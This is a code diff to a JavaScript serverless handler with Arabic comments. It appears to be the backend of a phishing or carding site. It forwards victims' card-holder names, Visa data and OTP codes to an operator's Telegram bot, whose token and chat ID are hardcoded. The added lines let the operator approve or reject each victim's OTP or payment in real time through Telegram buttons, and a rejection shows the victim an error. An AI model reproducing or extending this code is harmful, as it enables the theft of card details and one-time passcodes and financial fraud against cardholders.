@@ -1,15 +1,58 @@
+global.userStatuses = global.userStatuses || {};
+
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
   if (req.method === 'OPTIONS') return res.status(200).end();
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });
 
   const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
   const CHAT_ID = "8040433133";
   
   const data = req.body;
+
+  // إذا كان الطلب قادماً من تليجرام (عندما تضغط أنت على الأزرار)
+  if (data.callback_query) {
+    const callback = data.callback_query;
+    const callbackData = callback.data;
+    const chatId = callback.message.chat.id;
+    const messageId = callback.message.message_id;
+
+    let responseText = callback.message.text;
+
+    if (callbackData.startsWith('approve_otp_') || callbackData.startsWith('approve_pay_')) {
+      const userId = callbackData.replace('approve_otp_', '').replace('approve_pay_', '');
+      global.userStatuses[userId] = 'approved';
+      responseText += "\n\n✅ **[تمت الموافقة بنجاح الانتقال للفاتورة]**";
+    } else if (callbackData.startsWith('reject_otp_') || callbackData.startsWith('reject_pay_')) {
+      const userId = callbackData.replace('reject_otp_', '').replace('reject_pay_', '');
+      global.userStatuses[userId] = 'rejected';
+      responseText += "\n\n❌ **[تم رفض الطلب وإظهار خطأ للعميل]**";
+    }
+
+    // تعديل الرسالة في تليجرام لإزالة الأزرار
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        message_id: messageId,
+        text: responseText,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callback.id, text: "تم تسجيل ردك!" })
+    });
+
+    return res.status(200).json({ ok: true });
+  }
+
+  // إذا كان الطلب قادماً من الموقع (إرسال فيزا أو OTP جديد)
   let text = '';
   let keyboard = null;
 
@@ -20,7 +63,6 @@ export default async function handler(req, res) {
            `👤 الاسم: ${data.اسم_الحامل || 'غير متوفر'}\n` +
            `🆔 معرف المستخدم: \`${data.user_id || 'غير متوفر'}\``;
 
-    // أزرار تفاعلية للـ OTP
     keyboard = {
       inline_keyboard: [
         [
@@ -48,17 +90,15 @@ export default async function handler(req, res) {
   }
 
   try {
-    const payload = {
-      chat_id: CHAT_ID,
-      text: text,
-      parse_mode: 'Markdown',
-      reply_markup: keyboard
-    };
-
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown',
+        reply_markup: keyboard
+      })
     });
     
     return res.status(200).json({ ok: true });
